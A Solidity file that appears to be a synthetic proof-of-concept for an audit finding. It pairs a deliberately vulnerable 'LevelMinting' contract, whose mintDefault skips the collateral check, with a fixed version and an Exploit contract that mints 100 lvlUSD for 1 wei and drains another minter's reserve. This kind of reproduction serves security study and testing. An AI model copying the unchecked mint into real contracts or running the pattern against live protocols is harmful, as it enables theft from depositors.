// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Level Minting — mintDefault skips computeCollateralOrlvlUSDAmount
    (Cantina, September 2024, finding 42042).
    SYNTHETIC, cheatcode-free. mintDefault passes the caller's order straight
    into _mint. A minter posts 1 wei and mints 100 lvlUSD, then redeems the
    reserve another minter funded 1:1. */

contract Collateral {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LvlUSD {
    string public constant symbol = "lvlUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract LevelMinting {
    struct Order {
        address benefactor;
        uint256 collateral_amount;
        uint256 lvlusd_amount;
    }

    error MsgSenderIsNotBenefactor();

    Collateral public collateral;
    LvlUSD public lvlusd;
    mapping(address => bool) public minters;
    bool public enabled = true;

    modifier onlyMinterWhenEnabled() {
        require(enabled && minters[msg.sender], "minter");
        _;
    }

    constructor(Collateral _collateral, LvlUSD _lvlusd) {
        collateral = _collateral;
        lvlusd = _lvlusd;
    }

    function setMinter(address who, bool ok) external {
        minters[who] = ok;
    }

    function computeCollateralOrlvlUSDAmount(Order memory order) public pure returns (Order memory) {
        order.collateral_amount = order.lvlusd_amount;
        return order;
    }

    function _mint(Order memory order) internal {
        collateral.transferFrom(order.benefactor, address(this), order.collateral_amount);
        lvlusd.mint(order.benefactor, order.lvlusd_amount);
    }

    function mintDefault(Order memory order) external onlyMinterWhenEnabled {
        if (msg.sender != order.benefactor) revert MsgSenderIsNotBenefactor();
        _mint(order); // @> VULN: lvlusd_amount is minted without computeCollateralOrlvlUSDAmount
    }

    function mintDefaultFixed(Order memory order) external onlyMinterWhenEnabled {
        if (msg.sender != order.benefactor) revert MsgSenderIsNotBenefactor();
        Order memory checked = computeCollateralOrlvlUSDAmount(order);
        _mint(checked);
    }

    function redeem(uint256 amount) external returns (uint256 paid) {
        lvlusd.burn(msg.sender, amount);
        paid = amount;
        uint256 bal = collateral.balanceOf(address(this));
        if (paid > bal) paid = bal;
        if (paid > 0) collateral.transfer(msg.sender, paid);
    }
}

contract ReserveMinter {
    function fund(LevelMinting minting, Collateral collateral, uint256 amount) external {
        collateral.approve(address(minting), amount);
        LevelMinting.Order memory order = LevelMinting.Order({
            benefactor: address(this), collateral_amount: amount, lvlusd_amount: amount
        });
        minting.mintDefault(order);
    }

    function redeem(LevelMinting minting, uint256 amount) external returns (uint256) {
        return minting.redeem(amount);
    }
}

contract Exploit {
    Collateral public collateral;
    LvlUSD public lvlusd;
    LevelMinting public minting;
    ReserveMinter public reserve;

    uint256 public attackerCollateral;
    uint256 public reserveLeft;

    constructor() {
        collateral = new Collateral();
        lvlusd = new LvlUSD();
        minting = new LevelMinting(collateral, lvlusd);
        reserve = new ReserveMinter();
        minting.setMinter(address(this), true);
        minting.setMinter(address(reserve), true);

        collateral.mint(address(reserve), 100e18);
        reserve.fund(minting, collateral, 100e18);
        collateral.mint(address(this), 1);
        collateral.approve(address(minting), type(uint256).max);
    }

    function run() external {
        LevelMinting.Order memory order = LevelMinting.Order({
            benefactor: address(this), collateral_amount: 1, lvlusd_amount: 100e18
        });
        minting.mintDefault(order);
        require(lvlusd.balanceOf(address(this)) == 100e18, "unbacked mint");
        require(collateral.balanceOf(address(minting)) == 100e18 + 1, "reserve");

        minting.redeem(100e18);
        uint256 victimOut = reserve.redeem(minting, 100e18);

        attackerCollateral = collateral.balanceOf(address(this));
        reserveLeft = collateral.balanceOf(address(minting));
        require(attackerCollateral == 100e18, "did not take the reserve");
        require(victimOut == 1, "reserve minter was made whole");
        require(reserveLeft == 0, "dust left");
    }

    function runFixed() external {
        LevelMinting.Order memory order = LevelMinting.Order({
            benefactor: address(this), collateral_amount: 1, lvlusd_amount: 100e18
        });
        (bool ok,) = address(minting).call(abi.encodeWithSelector(minting.mintDefaultFixed.selector, order));
        require(!ok, "fixed mint accepted 1 wei");
        require(lvlusd.balanceOf(address(this)) == 0, "minted");
        require(collateral.balanceOf(address(minting)) == 100e18, "reserve moved");
    }
}
